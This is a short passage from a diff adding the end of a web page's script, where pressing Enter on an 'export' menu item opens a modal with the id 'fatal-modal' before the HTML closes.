+        case 'Enter':
+          const activeItem = allItems[selectedIndex];
+          if (activeItem && activeItem.action === "export") {
+              modalOpen = true;
+              document.getElementById('fatal-modal').classList.add('open');
+          }
+          break;
+      }
+  }
+});
+</script>
+</body>
+</html>
